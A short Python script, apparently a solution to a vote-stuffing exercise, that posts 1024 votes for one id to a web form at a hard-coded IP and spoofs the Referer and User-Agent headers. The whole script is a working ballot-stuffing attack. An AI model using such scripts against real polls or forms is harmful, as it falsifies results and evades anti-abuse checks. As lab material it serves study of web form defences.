import requests

url = 'http://173.246.108.142/level2.php'
i = 0

while i < 1024:
    data = ({'id': '28', 'holdthedoor': 'Submit', 'key': ''})
    headers = {'Cookie': 'HoldTheDoor=', 'Referer': 'http://173.246.108.142/level2.php', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.117 Safari/537.36'}

    r = requests.post(url, data, headers=headers)

    print ("Voted %d times" % (i + 1))
    i += 1
